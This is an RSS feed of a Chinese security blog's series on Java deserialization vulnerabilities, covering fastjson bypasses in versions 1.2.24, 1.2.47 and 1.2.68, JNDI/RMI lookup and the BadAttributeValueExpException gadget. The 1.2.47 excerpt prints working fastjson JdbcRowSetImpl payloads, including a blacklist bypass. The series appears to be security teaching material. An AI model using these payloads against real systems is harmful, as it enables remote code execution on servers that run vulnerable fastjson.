<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>反序列化 on 整点Bug</title><link>https://www.typesafe.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><description>Recent content in 反序列化 on 整点Bug</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sat, 06 Nov 2021 17:16:00 +0800</lastBuildDate><atom:link href="https://www.typesafe.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml"/><item><title>Java 反序列化漏洞原理（六）fastjson 1.2.68 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</link><pubDate>Sat, 06 Nov 2021 17:16:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-6/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1268-expectclass-绕过原理">Fastjson &amp;lt;= 1.2.68 expectClass 绕过原理&lt;/h2>
&lt;p>当 fastjson 更新到 1.2.68 之后，大部分安全漏洞都已经封堵住了，但不排除还有人手里握着一些 0day 没有放出来。&lt;/p>
&lt;p>fastjson 1.2.68 在进行反序列化的时候，会进入 &lt;code>ObjectDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法，而 安全人员发现 当 &lt;code>@type&lt;/code> 为 &lt;code>java.lang.AutoCloseable&lt;/code> 的时候会找到实现类 &lt;code>JavaBeanDeserializer&lt;/code> 调用 &lt;code>deserialze&lt;/code>，而 &lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 方法还会继续解析得到第二个 &lt;code>@type&lt;/code> 对应的值进行反序列化，并且 &lt;code>expectClass&lt;/code> 则不再是 &lt;code>null&lt;/code> 值，而是 &lt;code>java.lang.AutoCloseable&lt;/code>。&lt;/p>
&lt;p>&lt;code>JavaBeanDeserializer&lt;/code> 的 &lt;code>deserialze&lt;/code> 部分代码示例。&lt;/p>
&lt;pre tabindex="0">&lt;code>if (lexer.token() == JSONToken.LITERAL_STRING) {
 // 第二个 @type 的值
 String typeName = lexer.stringVal();
 lexer.nextToken(JSONToken.COMMA);

 if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) {
 if (lexer.token() == JSONToken.RBRACE) {
 lexer.nextToken();
 break;
 }
 continue;
 }
 
 // 这里没有获取到 deserializer
 ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName);
 Class&amp;lt;?&amp;gt; userType = null;

 if (deserializer == null) {
 // 第一个 @type 的值 
 Class&amp;lt;?&amp;gt; expectClass = TypeUtils.getClass(type);
 // 在包含 expectClass 时会绕过
 userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures());
 deserializer = parser.getConfig().getDeserializer(userType);
 }
 
 // 再次进行反序列化，会触发反射构造实例
 Object typedObject = deserializer.deserialze(parser, userType, fieldName);
 if (deserializer instanceof JavaBeanDeserializer) {
 JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;
 if (typeKey != null) {
 FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey);
 if (typeKeyFieldDeser != null) {
 typeKeyFieldDeser.setValue(typedObject, typeName);
 }
 }
 }
 return (T) typedObject;
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>ParseConfig&lt;/code> 的 &lt;code>checkAutoType&lt;/code> 部分代码示例，只要第二个 &lt;code>@type&lt;/code> 继承了 第一个 &lt;code>@type&lt;/code> 即可触发。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（五）fastjson 1.2.47 绕过原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</link><pubDate>Sun, 31 Oct 2021 21:31:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-5/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson--1247-poc">Fastjson &amp;lt;= 1.2.47 POC&lt;/h2>
&lt;p>随着 fastjson 的更新，以往的安全漏洞都被封堵掉了，但道高一尺，魔高一丈，安全人员发现了一个通杀的漏洞，以往的封堵手段都可以绕过，算是一个里程碑的发现。&lt;/p>
&lt;p>我们首先将 fastjson 升级到 1.2.47 版本，然后使用我们之前的POC进行测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval3&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>不出意料的话会出现这样的错误提示信息：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>autoType is not support. com.sun.rowset.JdbcRowSetImpl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这是因为 fastjson 使用了黑名单机制，禁止将 &lt;code>com.sun.rowset.JdbcRowSetImpl&lt;/code> 反序列化。&lt;/p>
&lt;p>下面我们使用新的 POC 进行测试，又可以利用成功了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> com.alibaba.fastjson.JSON;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval5&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String payload &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;{\&amp;#34;a\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;java.lang.Class\&amp;#34;,\&amp;#34;val\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;},\&amp;#34;b\&amp;#34;:{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.sun.rowset.JdbcRowSetImpl\&amp;#34;,\&amp;#34;dataSourceName\&amp;#34;:\&amp;#34;rmi://localhost:1099/Exploit\&amp;#34;,\&amp;#34;autoCommit\&amp;#34;:true}}&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> JSON.&lt;span style="color:#50fa7b">parse&lt;/span>(payload);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload 格式化之后如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;a&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;java.lang.Class&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f1fa8c">&amp;#34;b&amp;#34;&lt;/span>: {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;@type&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;dataSourceName&amp;#34;&lt;/span>: &lt;span style="color:#f1fa8c">&amp;#34;rmi://localhost:1099/Exploit&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#f1fa8c">&amp;#34;autoCommit&amp;#34;&lt;/span>: &lt;span style="color:#ff79c6">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="fastjson--1247-绕过原理">Fastjson &amp;lt;= 1.2.47 绕过原理&lt;/h2>
&lt;p>在学习绕过原理之前，了解 fastjson 的基本解析流程还是有必要的，我画了一张类图仅供参考，图中只画了主要流程，还有很多类没有画。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（四）JNDI + RMI/LDAP 在fastjson中的利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</link><pubDate>Sat, 30 Oct 2021 13:43:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-4/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="jndi-是什么">JNDI 是什么&lt;/h2>
&lt;p>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。&lt;/p>
&lt;p>JNDI 包含在Java SE中，不需要引用第三方jar即可使用。要使用 JNDI 必须要有一个或多个服务提供者。JDK 本身已经包括了下面几种服务提供者。&lt;/p>
&lt;ul>
&lt;li>轻量级目录访问协议 (LDAP)&lt;/li>
&lt;li>CORBA 公共对象服务命名（COS naming）&lt;/li>
&lt;li>Java 远程方法调用 (RMI)&lt;/li>
&lt;li>域名服务 (DNS)&lt;/li>
&lt;/ul>
&lt;p>这么说起来还是有点抽象，简单理解就是&lt;strong>服务提供者&lt;/strong>提供一个类似Key Value的数据，&lt;strong>JNDI&lt;/strong>可以通过这个 Key 获取到&lt;strong>服务提供者&lt;/strong>上的提供的Value，因此JNDI是无法单独使用的。&lt;/p>
&lt;p>使用JNDI的方式也很简单，下面就是一个获取远程对象的示例代码。&lt;/p>
&lt;pre tabindex="0">&lt;code>// 创建一个上下文对象
InitialContext context = new InitialContext();
// 查找监听在本地 1099 端口上 RMI 服务的 Object 对象
Object obj = context.lookup(&amp;#34;rmi://localhost:1099/Object&amp;#34;);
&lt;/code>&lt;/pre>&lt;h2 id="rmi-是什么">RMI 是什么&lt;/h2>
&lt;p>RMI 是 Remote Method Invocation 的缩写，中文含义为远程方法调用，即一个Java程序调用调用另一个Java程序暴露出来的方法。&lt;/p>
&lt;p>RMI 有三个概念：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Registry :&lt;/strong> 提供服务注册和服务获取，服务端将类名称，存放地址注册到Registry中，以供客户端获取。&lt;/li>
&lt;li>&lt;strong>Server :&lt;/strong> 远程方法的提供者。&lt;/li>
&lt;li>&lt;strong>Client :&lt;/strong> 远程方法的调用者。&lt;/li>
&lt;/ul>
&lt;p>远程方法的定义需要满足两个条件：&lt;/p>
&lt;ol>
&lt;li>实现 &lt;code>java.rmi.Remote&lt;/code>。&lt;/li>
&lt;li>继承 &lt;code>java.rmi.server.UnicastRemoteObject&lt;/code>。&lt;/li>
&lt;/ol>
&lt;h2 id="rmi-使用示例">RMI 使用示例&lt;/h2>
&lt;h3 id="registry">Registry&lt;/h3>
&lt;p>创建 Registry&lt;/p></description></item><item><title>Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</link><pubDate>Thu, 21 Oct 2021 22:56:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-3/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="fastjson-是什么">Fastjson 是什么&lt;/h2>
&lt;blockquote>
&lt;p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。&lt;/p>&lt;/blockquote>
&lt;blockquote>
&lt;p>fastjson相对其他JSON库的特点是快。fastjson在阿里巴巴大规模使用，在数万台服务器上部署，fastjson在业界被广泛接受。在2012年被开源中国评选为最受欢迎的国产开源软件之一。&lt;/p>&lt;/blockquote>
&lt;p>以上摘自Fastjson GitHub 介绍。&lt;/p>
&lt;p>但近年来随着 Fastjson 不断爆出漏洞，各大中小型公司都逐渐弃用 Fastjson ，甚至阿里自己开源的服务注册、配置管理平台 &lt;strong>NACOS&lt;/strong> 在 1.3.0 版本之后都从 Fastjson 替换为了 Jackson (详见 &lt;a href="https://github.com/alibaba/nacos/releases/tag/1.3.0">https://github.com/alibaba/nacos/releases/tag/1.3.0&lt;/a>) ，可见漏洞危害之大。&lt;/p>
&lt;h2 id="为什么会弃用-fastjson-">为什么会弃用 Fastjson ？&lt;/h2>
&lt;p>想要研究一个产品的漏洞其中有一条很好的途径就是去查询 CVE 编号，但是我在检索之后发现 Fastjson 只有 &lt;strong>CVE-2017-18349&lt;/strong> 这一条，而 Jackson 竟然有高达 76 条。&lt;/p>
&lt;p>这能否证明 Fastjson 比 Jackson 更安全呢？答案并不是，都是半斤八两，有些 Fastjson 里面出现的漏洞在 Jackson 里面也同样存在。&lt;/p>
&lt;p>那为什么会有公司弃用 Fastjson 呢？&lt;/p>
&lt;p>或许是 Jackson 有更完善且公开的漏洞管理机制，或许是国外的月亮比较圆，或许是随大流，也或许是 Fastjson 代码质量不过关（知乎上有很多回答批判 Fastjson 代码糟糕的），真实原因就不得而知了。&lt;/p>
&lt;p>尽管近年来有公司不断弃用 Fastjson ，但还有很多公司在使用，并且已经开发上线的系统想要替换或者升级 Fastjson 还需要时间，因此我们很有必要学习一下 Fastjson 漏洞的产因。&lt;/p>
&lt;h2 id="fastjson-漏洞产生原因">Fastjson 漏洞产生原因&lt;/h2>
&lt;p>Fastjson 第一次被爆出有漏洞是官方在2017年3月15日主动披露的，详见 &lt;a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315&lt;/a> 。漏洞影响 1.2.24 以及之前的版本。我们今天来研究一下当 fastjson version &amp;lt;= 1.2.24 时漏洞是如何产生的。&lt;/p></description></item><item><title>Java 反序列化漏洞原理（二）新版本JDK利用方式和Shiro举例</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</link><pubDate>Sat, 16 Oct 2021 22:55:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-2/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="新的希望">新的希望&lt;/h2>
&lt;h3 id="0x00">0x00&lt;/h3>
&lt;p>在上一节中我们介绍了 Java 反序列化漏洞的成因和利用 &lt;code>commons-collections 3.1&lt;/code> 搭配 &lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 实现远程命令执行的方式。但&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code> 的问题已经在最新版 jdk 中修复，可利用范围仅能够局限于旧版本的jdk。经过安全人员的审计，另一个类 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 出现在了安全人员的视野。&lt;/p>
&lt;p>&lt;code>javax.management.BadAttributeValueExpException&lt;/code> 继承自 &lt;code>java.lang.Exception&lt;/code>，&lt;code>java.lang.Exception&lt;/code> 继承自 &lt;code>java.lang.Throwable&lt;/code>，而 &lt;code>java.lang.Throwable&lt;/code> 实现了 &lt;code>java.io.Serializable&lt;/code>。因此 &lt;code>javax.management.BadAttributeValueExpException&lt;/code> 符合了 &lt;strong>可序列化&lt;/strong> 这个要求，同样的它也增加了 &lt;code>readObject&lt;/code> 方法，这个类的完整代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">package&lt;/span> javax.management;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.IOException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.ObjectInputStream;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Thrown when an invalid MBean attribute is passed to a query
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * constructing method. This exception is used internally by JMX
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * during the evaluation of a query. User code does not usually
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * see it.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @since 1.5
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">extends&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Serial version */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">long&lt;/span> serialVersionUID &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">-&lt;/span>3105272988410493376L;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @serial A string representation of the attribute that originated this exception.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * for example, the string value can be the return of {@code attribute.toString()}
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> Object val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Constructs a BadAttributeValueExpException using the specified Object to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * create the toString() value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * @param val the inappropriate value.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#50fa7b">BadAttributeValueExpException&lt;/span> (Object val) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">val&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> val &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> &lt;span style="color:#ff79c6">?&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span> : val.&lt;span style="color:#50fa7b">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> * Returns the string representing the object.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">toString&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;BadAttributeValueException: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> val;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">readObject&lt;/span>(ObjectInputStream ois) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> IOException, ClassNotFoundException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ObjectInputStream.&lt;span style="color:#50fa7b">GetField&lt;/span> gf &lt;span style="color:#ff79c6">=&lt;/span> ois.&lt;span style="color:#50fa7b">readFields&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object valObj &lt;span style="color:#ff79c6">=&lt;/span> gf.&lt;span style="color:#50fa7b">get&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;val&amp;#34;&lt;/span>, &lt;span style="color:#ff79c6">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> String) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val&lt;span style="color:#ff79c6">=&lt;/span> valObj;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> &lt;span style="color:#ff79c6">if&lt;/span> (System.&lt;span style="color:#50fa7b">getSecurityManager&lt;/span>() &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#ff79c6">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Long
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Integer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Float
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Double
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Byte
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Short
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">||&lt;/span> valObj &lt;span style="color:#ff79c6">instanceof&lt;/span> Boolean) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> valObj.&lt;span style="color:#50fa7b">toString&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#ff79c6">else&lt;/span> { &lt;span style="color:#6272a4">// the serialized object is from a version without JDK-8019292 fix&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> val &lt;span style="color:#ff79c6">=&lt;/span> System.&lt;span style="color:#50fa7b">identityHashCode&lt;/span>(valObj) &lt;span style="color:#ff79c6">+&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;@&amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> valObj.&lt;span style="color:#50fa7b">getClass&lt;/span>().&lt;span style="color:#50fa7b">getName&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
